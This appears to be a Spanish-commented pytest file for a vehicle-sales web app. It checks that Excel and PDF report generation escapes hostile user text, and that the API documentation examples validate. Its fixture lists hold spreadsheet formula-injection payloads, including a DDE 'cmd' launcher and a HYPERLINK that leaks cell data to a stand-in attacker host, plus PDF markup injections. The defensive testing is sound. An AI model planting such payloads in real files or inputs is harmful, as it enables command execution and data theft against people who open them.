# -*- coding: utf-8 -*-
"""Texto de otros dentro de los documentos.

Un ORM protege la base del texto que escribe la gente, pero no protege al
documento: un PDF y una hoja de cálculo son dos lenguajes más, cada uno con
su forma de confundir datos con instrucciones. Estas dos vías estaban
abiertas y las encontró una auditoría, no una prueba: por eso ahora hay
prueba.

Lo que se comprueba no es que el archivo salga, sino que la carga NO se
ejecute: en el Excel se mira el XML de dentro buscando fórmulas vivas, y en
el PDF que una etiqueta abierta no tumbe la generación.
"""

import io
import re
import zipfile
from datetime import datetime
from decimal import Decimal
from types import SimpleNamespace

import pytest

from app.reportes.excel import reporte_ventas_excel
from app.reportes.pdf import factura_pdf
from app.reportes.seguridad import texto_para_excel, texto_para_pdf

# Cargas reales. La de `cmd|` es la de DDE: al abrir el archivo, Excel
# ofrece ejecutar el programa.
CARGAS_EXCEL = [
    "=1+1",
    "=cmd|' /c calc'!A1",
    "+1+1",
    "-1+1",
    "@SUM(1,1)",
    '=HYPERLINK("http://malo.example/?d="&A1,"Pulsa")',
]

# Marcado que reportlab interpreta dentro de `Paragraph`.
CARGAS_PDF = [
    "Vehiculo <b> con etiqueta abierta",
    "Potencia < 500 hp",
    '<font color="red" size="40">ENORME</font>',
    "Rolls & Royce",
    "<script>alert(1)</script>",
    "Precio &nbsp incompleto",
    "</para><para>",
]


class TestEscapes:
    @pytest.mark.parametrize("carga", CARGAS_EXCEL)
    def test_excel_neutraliza_el_arranque(self, carga):
        assert texto_para_excel(carga).startswith("'")

    def test_excel_no_toca_el_texto_normal(self):
        """Poner un apóstrofo a todo dejaría medio reporte con una comilla
        delante."""
        assert texto_para_excel("MANSORY Phantom VIII") == "MANSORY Phantom VIII"
        assert texto_para_excel("V-2026-00001") == "V-2026-00001"

    @pytest.mark.parametrize("carga", CARGAS_PDF)
    def test_pdf_escapa_el_marcado(self, carga):
        escapado = texto_para_pdf(carga)
        assert "<" not in escapado
        assert ">" not in escapado

    def test_pdf_escapa_el_ampersand_primero(self):
        """Al revés, un `<` convertido en `&lt;` volvería a escaparse y
        saldría `&amp;lt;` en el documento."""
        assert texto_para_pdf("a & b < c") == "a &amp; b &lt; c"


class TestFacturaConTextoHostil:
    @pytest.mark.parametrize("carga", CARGAS_PDF)
    def test_no_tumba_la_factura(self, carga):
        """Una etiqueta abierta levantaba un ValueError y dejaba esa factura
        sin poder descargarse nunca."""
        salida = factura_pdf(_factura(nombre="Cliente", descripcion=carga))
        assert salida[:5] == b"%PDF-"

    @pytest.mark.parametrize("carga", CARGAS_PDF[:3])
    def test_tampoco_desde_el_nombre_del_cliente(self, carga):
        """El nombre lo elige quien se registra, así que es texto de fuera
        igual que cualquier otro."""
        salida = factura_pdf(_factura(nombre=carga, descripcion="Normal"))
        assert salida[:5] == b"%PDF-"


class TestExcelConTextoHostil:
    def test_ninguna_carga_queda_como_formula_viva(self):
        """Se mira el XML de dentro del archivo, no el resultado de la
        función: XlsxWriter convertía una cadena con `=` en un elemento
        `<f>`, que es una fórmula que Excel ejecuta al abrir."""
        libro = reporte_ventas_excel(_datos_con(CARGAS_EXCEL[1]))

        with zipfile.ZipFile(io.BytesIO(libro)) as archivo:
            for nombre in archivo.namelist():
                if not nombre.startswith("xl/worksheets/sheet"):
                    continue
                xml = archivo.read(nombre).decode("utf-8")
                for formula in re.findall(r"<f>(.*?)</f>", xml):
                    # Las únicas fórmulas del libro son las de totales que
                    # pone el generador a propósito.
                    assert formula.startswith(("SUM(", "SUBTOTAL(")), formula

    @pytest.mark.parametrize("carga", CARGAS_EXCEL)
    def test_la_carga_sale_neutralizada(self, carga):
        libro = reporte_ventas_excel(_datos_con(carga))

        with zipfile.ZipFile(io.BytesIO(libro)) as archivo:
            cadenas = archivo.read("xl/sharedStrings.xml").decode("utf-8")

        assert f"<t>{carga}</t>" not in cadenas, "la celda salió sin neutralizar"

    def test_los_totales_siguen_siendo_formulas(self):
        """Apagar `strings_to_formulas` no puede haberse llevado por delante
        los totales, que SÍ tienen que recalcularse al filtrar."""
        libro = reporte_ventas_excel(_datos_con("Cliente Normal"))

        with zipfile.ZipFile(io.BytesIO(libro)) as archivo:
            xml = "".join(
                archivo.read(n).decode("utf-8")
                for n in archivo.namelist()
                if n.startswith("xl/worksheets/sheet")
            )

        assert "SUBTOTAL(109" in xml


# ---------------------------------------------------------------------------
def _linea(descripcion):
    return SimpleNamespace(
        id=1, descripcion=descripcion, cantidad=1,
        precio_unitario=Decimal("1000000"), descuento=Decimal(0),
        subtotal=Decimal("1000000"), producto_id=1, servicio_id=None,
    )


def _factura(nombre: str, descripcion: str):
    comprador = SimpleNamespace(
        nombre=nombre, apellido="Apellido", tipo_documento="CC",
        numero_documento="1234567890", direccion="Calle 1",
        correo="x@y.com", telefono="3001112233",
    )
    venta = SimpleNamespace(
        numero="V-2026-00001", cliente=comprador, vendedor=None,
        fecha=datetime.now(), subtotal=Decimal("1000000"),
        descuento=Decimal(0), impuestos=Decimal("190000"),
        total=Decimal("1190000"), estado="pagada", notas=None,
        lineas=[_linea(descripcion)], factura=None,
    )
    return SimpleNamespace(
        id=1, numero="F-2026-00001", venta_id=1, venta=venta,
        fecha_emision=datetime.now(), subtotal=Decimal("1000000"),
        impuestos=Decimal("190000"), total=Decimal("1190000"),
        estado="emitida", lineas=[_linea(descripcion)],
    )


def _datos_con(carga: str) -> dict:
    """Mete la misma carga en todos los sitios donde entra texto ajeno."""
    venta = _factura(carga, carga).venta
    venta.cliente = SimpleNamespace(nombre=carga, apellido="X")
    venta.numero = carga
    venta.estado = carga

    hoy = datetime.now().date()
    return {
        "desde": hoy, "hasta": hoy, "alcance": carga,
        "resumen": {
            "total": 1, "pendientes": 0, "pagadas": 1, "anuladas": 0,
            "ingresos": Decimal("1190000"), "ticket_promedio": Decimal("1190000"),
        },
        "por_dia": [{"fecha": hoy.isoformat(), "ventas": 1, "ingresos": 1190000.0}],
        "por_estado": [],
        "top_vehiculos": [{"descripcion": carga, "unidades": 1, "importe": 1000.0}],
        "top_servicios": [],
        "ventas": [venta],
    }


class TestEjemplosDeLaDocumentacion:
    """Los ejemplos de `/docs` tienen que poder copiarse y enviarse.

    Un ejemplo que no valida es peor que no poner ninguno: quien lo copia de
    la documentacion recibe un 422 y se pone a buscar el fallo en su codigo.
    Al escribirlos ya paso: el de ProductoCrear se dejaba fuera el `slug`,
    que es obligatorio, y esta prueba es la que lo dijo.
    """

    @staticmethod
    def _con_ejemplo():
        from app.schemas.auth import Credenciales
        from app.schemas.chat import MensajeCrear
        from app.schemas.cita import CitaCrear
        from app.schemas.pqr import PqrCrear
        from app.schemas.producto import ProductoCrear
        from app.schemas.usuario import UsuarioCrear, UsuarioRegistro
        from app.schemas.venta import VentaCrear

        return [Credenciales, UsuarioRegistro, UsuarioCrear, ProductoCrear,
                VentaCrear, PqrCrear, CitaCrear, MensajeCrear]

    def test_los_esquemas_de_entrada_traen_ejemplo(self):
        for clase in self._con_ejemplo():
            extra = clase.model_config.get("json_schema_extra") or {}
            assert extra.get("example"), (
                "%s no trae cuerpo de ejemplo para /docs" % clase.__name__)

    def test_cada_ejemplo_es_una_peticion_valida(self):
        """Se valida el ejemplo contra su propio esquema."""
        for clase in self._con_ejemplo():
            ejemplo = clase.model_config["json_schema_extra"]["example"]
            clase.model_validate(ejemplo)   # revienta si no vale

    def test_los_ejemplos_van_en_camelCase(self):
        """Como viaja la API de verdad.

        Un ejemplo en snake_case tambien lo aceptaria el servidor
        —`populate_by_name` lo permite—, pero no es lo que el frontend manda
        ni lo que se ve en el resto de la documentacion.
        """
        for clase in self._con_ejemplo():
            ejemplo = clase.model_config["json_schema_extra"]["example"]
            alias = {c.alias or n for n, c in clase.model_fields.items()}
            for campo in ejemplo:
                assert campo in alias, (
                    "%s.%s no coincide con ningun alias" % (clase.__name__, campo))

    def test_la_especificacion_los_publica(self):
        """Que esten en la clase no basta: tienen que llegar al OpenAPI."""
        from app.main import app

        esquemas = app.openapi()["components"]["schemas"]
        for clase in self._con_ejemplo():
            assert "example" in esquemas.get(clase.__name__, {}), (
                "%s no publica su ejemplo en /docs" % clase.__name__)
